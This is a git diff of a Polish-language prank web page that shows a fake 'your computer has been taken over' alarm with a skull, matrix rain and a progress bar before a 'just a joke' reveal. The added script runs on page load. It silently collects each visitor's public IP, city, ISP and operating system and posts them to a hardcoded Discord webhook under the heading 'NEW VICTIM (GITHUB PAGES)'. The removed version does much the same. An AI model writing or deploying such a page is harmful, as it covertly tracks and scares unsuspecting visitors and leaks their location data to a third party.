@@ -4,16 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SYSTEM ALERT - Krytyczny błąd bezpieczeństwa</title>
-
-pizda.html
-8 KB
-﻿
-<!DOCTYPE html>
-<html lang="pl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM ALERT - Krytyczny błąd bezpieczeństwa</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
 
@@ -41,7 +31,7 @@ pizda.html
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            opacity: 0.07;
+            opacity: 0.1;
             z-index: 0;
         }
 
@@ -50,7 +40,6 @@ pizda.html
             z-index: 10;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
@@ -61,31 +50,113 @@ pizda.html
             background: rgba(0,0,0,0.95);
             max-width: 750px;
             width: 100%;
-            padding: 0;
-            box-shadow: 0 0 40px rgba(255,0,0,0.5);
-            animation: borderPulse 1s infinite;
+            box-shadow: 0 0 50px rgba(255,0,0,0.5), inset 0 0 40px rgba(255,0,0,0.05);
+            animation: borderPulse 1.2s infinite;
         }
 
         @keyframes borderPulse {
             0%, 100% { box-shadow: 0 0 40px rgba(255,0,0,0.5); }
-            50% { box-shadow: 0 0 80px rgba(255,0,0,0.9); }
+            50% { box-shadow: 0 0 80px rgba(255,0,0,0.8); }
         }
 
-        .alert-header { background: #ff0000; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; color: #000; font-family: 'Orbitron'; font-weight: 900; }
+        .alert-header {
+            background: #ff0000;
+            padding: 15px;
+            color: #000;
+            font-family: 'Orbitron';
+            font-weight: 900;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
         .alert-body { padding: 30px; }
-        .skull { text-align: center; font-size: 60px; margin-bottom: 15px; }
-        h1 { font-family: 'Orbitron'; font-size: 22px; color: #ff0000; text-align: center; letter-spacing: 4px; }
-        
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .info-card { background: rgba(255,0,0,0.05); border: 1px solid #ff000044; padding: 12px; }
-        .label { color: #ff6666; font-size: 9px; letter-spacing: 2px; }
-        .value { color: #00ff41; font-size: 13px; }
 
-        .progress-bar { height: 8px; background: #1a0000; border: 1px solid #ff000044; overflow: hidden; margin-bottom: 10px; }
-        .progress-fill { height: 100%; background: #ff0000; width: 0%; transition: width 0.3s; }
-        .btn-panic { width: 100%; padding: 18px; background: #ff0000; border: none; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; }
+        .skull {
+            text-align: center;
+            font-size: 65px;
+            margin-bottom: 15px;
+            animation: shake 0.4s infinite;
+            filter: drop-shadow(0 0 15px red);
+        }
 
-        #reveal-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+        @keyframes shake {
+            0%,100%{transform:translateX(0)}
+            25%{transform:translateX(-4px)}
+            75%{transform:translateX(4px)}
+        }
+
+        h1 {
+            font-family: 'Orbitron';
+            font-size: 24px;
+            color: #ff0000;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px red;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .info-card {
+            background: rgba(255,0,0,0.05);
+            border: 1px solid #ff000044;
+            padding: 15px;
+        }
+
+        .label { color: #ff6666; font-size: 10px; text-transform: uppercase; margin-bottom: 5px; }
+        .value { color: #00ff41; font-size: 14px; }
+
+        .progress-bar {
+            height: 10px;
+            background: #1a0000;
+            border: 1px solid #ff000044;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6600);
+            width: 0%;
+            box-shadow: 0 0 15px red;
+        }
+
+        .typing-text {
+            font-size: 12px;
+            color: #00cc33;
+            height: 30px;
+            margin-bottom: 20px;
+        }
+
+        .btn-panic {
+            width: 100%;
+            padding: 20px;
+            background: #ff0000;
+            border: none;
+            color: #000;
+            font-family: 'Orbitron';
+            font-weight: 900;
+            font-size: 15px;
+            letter-spacing: 5px;
+            cursor: pointer;
+        }
+
+        #reveal-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #000;
+            z-index: 1000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
     </style>
 </head>
 <body>
@@ -99,30 +170,52 @@ pizda.html
         <div class="alert-body">
             <div class="skull">💀</div>
             <h1>TWÓJ KOMPUTER ZOSTAŁ PRZEJĘTY</h1>
+            
             <div class="info-grid">
-                <div class="info-card"><div class="label">IP</div><div id="ip-display" class="value">SKANOWANIE...</div></div>
-                <div class="info-card"><div class="label">MIASTO</div><div id="loc-display" class="value">USTALANIE...</div></div>
-                <div class="info-card"><div class="label">SYSTEM</div><div id="os-display" class="value">...</div></div>
-                <div class="info-card"><div class="label">STATUS</div><div class="value" style="color:red">ZAINFEKOWANY</div></div>
+                <div class="info-card">
+                    <div class="label">Public IP</div>
+                    <div class="value" id="ip-display">Pobieranie...</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Lokalizacja</div>
+                    <div class="value" id="loc-display">Lokalizowanie...</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">System</div>
+                    <div class="value" id="os-display">Wykrywanie...</div>
+                </div>
+                <div class="info-card">
+                    <div class="label">Status</div>
+                    <div class="value" style="color:red;">ZAINFEKOWANY</div>
+                </div>
             </div>
-            <div class="progress-bar"><div class="progress-fill" id="p1"></div></div>
-            <div id="log-box" style="font-size: 10px; color: #00ff41; height: 40px; margin-bottom: 20px;"></div>
-            <button class="btn-panic" onclick="showReveal()">STOP HACK</button>
+
+            <div class="progress-bar"><div class="progress-fill" id="p-bar"></div></div>
+            <div class="typing-text" id="typing-box">> Inicjalizacja ataku...</div>
+
+            <button class="btn-panic" onclick="showReveal()">🚨 ZATRZYMAJ ATAK 🚨</button>
         </div>
     </div>
 </div>
 
 <div id="reveal-screen">
-    <h1 style="color:#00ff41; font-size: 40px;">HAHA ŻART! 😂</h1>
-    <p>Twoje dane są bezpieczne.</p>
+    <h1 style="color: #00ff41; font-size: 50px;">HAHA ŻART! 😂</h1>
+    <div style="font-size: 100px; margin-top: 30px;">✅</div>
 </div>
 
 <script>
-    // Matrix effect
+    // Cursor
+    const cursor = document.getElementById('cursor');
+    document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX - 10 + 'px';
+        cursor.style.top = e.clientY - 10 + 'px';
+    });
+
+    // Matrix Rain
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const drops = Array(Math.floor(canvas.width/20)).fill(1);
+    const drops = Array(Math.floor(canvas.width / 20)).fill(1);
     function draw() {
         ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
         ctx.fillStyle = '#00ff41'; ctx.font = '15px monospace';
@@ -134,53 +227,61 @@ pizda.html
     }
     setInterval(draw, 50);
 
-    // Cursor
-    document.addEventListener('mousemove', e => {
-        const c = document.getElementById('cursor');
-        c.style.left = e.clientX - 10 + 'px';
-        c.style.top = e.clientY - 10 + 'px';
-    });
+    // SYSTEM INFO
+    document.getElementById('os-display').textContent = navigator.platform;
 
-    // POBIERANIE IP I WYSYŁKA NA DISCORD
-    const DISCORD_URL = 'https://discordapp.com/api/webhooks/1479604054144323776/jTaf2b7izpoRE2wzqnlx3imiYGKPI5mtK1XFiPYzvR01RrOwqGsvrexuA00w6zigWDLL';
+    // --- LOGIKA IP I DISCORDA (HTTPS READY) ---
+    const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1479604054144323776/jTaf2b7izpoRE2wzqnlx3imiYGKPI5mtK1XFiPYzvR01RrOwqGsvrexuA00w6zigWDLL';
 
-    fetch('http://ip-api.com/json/')
-    .then(res => res.json())
-    .then(data => {
-        const ip = data.query || "Błąd";
-        const city = data.city || "Nieznane";
-        const isp = data.isp || "Nieznany";
+    async function catchData() {
+        try {
+            // Zmieniamy na ipapi.co (obsługuje HTTPS za darmo)
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            
+            const ip = data.ip || "Nie wykryto";
+            const city = data.city || "Nieznane";
+            const isp = data.org || "Nieznany";
 
-        // Wyświetlanie na stronie
-        document.getElementById('ip-display').textContent = ip;
-        document.getElementById('loc-display').textContent = city;
-        document.getElementById('os-display').textContent = navigator.platform;
+            document.getElementById('ip-display').textContent = ip;
+            document.getElementById('loc-display').textContent = city;
 
-        // Wysyłanie na Discord
-        fetch(DISCORD_URL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🚀 NOWA OFIARA",
-                    color: 16711680,
-                    fields: [
-                        {name: "IP", value: ip, inline: true},
-                        {name: "MIASTO", value: city, inline: true},
-                        {name: "ISP", value: isp, inline: false}
-                    ]
-                }]
-            })
-        });
-    }).catch(err => {
-        document.getElementById('ip-display').textContent = "Błąd API";
-    });
+            // Wyślij na Discord
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 NOWA OFIARA (GITHUB PAGES)",
+                        color: 16711680,
+                        fields: [
+                            {name: "🌐 IP", value: ip, inline: true},
+                            {name: "📍 Miasto", value: city, inline: true},
+                            {name: "📡 ISP", value: isp, inline: false},
+                            {name: "💻 System", value: navigator.platform, inline: true}
+                        ]
+                    }]
+                })
+            });
+        } catch(e) {
+            document.getElementById('ip-display').textContent = "Blokada AdBlocka";
+            document.getElementById('loc-display').textContent = "Zablokowano";
+        }
+    }
+    catchData();
 
-    // Progress bar animation
+    // Progress bar
     let p = 0;
-    setInterval(() => { if(p < 100) { p++; document.getElementById('p1').style.width = p + '%'; } }, 100);
+    setInterval(() => {
+        if(p < 100) {
+            p += 0.3;
+            document.getElementById('p-bar').style.width = p + '%';
+        }
+    }, 100);
 
-    function showReveal() { document.getElementById('reveal-screen').style.display = 'flex'; }
+    function showReveal() {
+        document.getElementById('reveal-screen').style.display = 'flex';
+    }
 </script>
 </body>
 </html>
